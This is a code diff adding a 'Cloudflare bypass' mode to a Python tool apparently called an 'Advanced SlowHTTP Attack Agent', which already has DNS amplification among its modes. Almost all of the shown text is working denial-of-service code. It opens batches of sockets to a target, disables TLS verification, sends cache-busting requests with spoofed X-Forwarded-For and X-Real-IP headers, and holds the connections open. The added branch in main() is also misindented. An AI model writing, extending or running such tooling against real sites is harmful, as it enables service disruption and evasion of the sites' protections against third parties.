@@ -3094,6 +3094,73 @@ class AdvancedHTTPAttacker:
         
         print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")
 
+    def cloudflare_bypass_attack(self, num_connections, delay, duration):
+        """Cloudflare Bypass attack - attempts to bypass Cloudflare protection"""
+        print(f"[CLOUDFLARE-BYPASS] Starting attack on {self.target}:{self.port}")
+        print(f"[CONFIG] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        self.running = True
+        start_time = time.time()
+        
+        try:
+            print("[PHASE1] Attempting Cloudflare bypass techniques...")
+            
+            cycle_count = 0
+            while self.running:
+                if duration > 0 and (time.time() - start_time) >= duration:
+                    print("Duration limit reached, stopping attack")
+                    break
+                
+                cycle_count += 1
+                
+                # Create bypass connections
+                for i in range(min(num_connections, 50)):
+                    if not self.running:
+                        break
+                    
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(10)
+                        sock.connect((self.target, self.port))
+                        
+                        if self.use_ssl:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            sock = context.wrap_socket(sock, server_hostname=self.target)
+                        
+                        # Send bypass request
+                        request = f"GET {self.path}?bypass={random.randint(1000, 9999)} HTTP/1.1\r\n"
+                        request += f"Host: {self.target}\r\n"
+                        request += f"User-Agent: {self.user_agent}\r\n"
+                        request += "X-Forwarded-For: 127.0.0.1\r\n"
+                        request += "X-Real-IP: 127.0.0.1\r\n"
+                        request += "Cache-Control: no-cache\r\n"
+                        request += "Connection: close\r\n"
+                        request += "\r\n"
+                        
+                        sock.send(request.encode())
+                        
+                        with self.lock:
+                            self.connections.append(sock)
+                        
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                        
+                    except Exception as e:
+                        self.stats["error_count"] += 1
+                
+                print(f"[CYCLE {cycle_count}] Active: {self.stats['connections_active']} | "
+                      f"Packets: {self.stats['packets_sent']} | "
+                      f"Errors: {self.stats['error_count']}")
+                
+                time.sleep(delay)
+        
+        finally:
+            self.stop_attack()
+            print("[COMPLETE] Cloudflare bypass attack finished")
+
 def main():
     parser = argparse.ArgumentParser(description="Advanced SlowHTTP Attack Agent")
     parser.add_argument("--target", help="Target hostname or IP")
@@ -3159,6 +3226,9 @@ def main():
                 print("[ERROR] DNS Amplification attack requires --target-ip parameter")
                 sys.exit(1)
             attacker.dns_amplification_attack(args.target_ip, args.connections, args.duration)
+           elif args.attack_type == "cloudflare_bypass":
+               print("[INFO] Starting Cloudflare Bypass attack...")
+               attacker.cloudflare_bypass_attack(args.connections, args.delay, args.duration)
     except KeyboardInterrupt:
         print("\\n[INTERRUPTED] Stopping attack...")
         attacker.stop_attack()
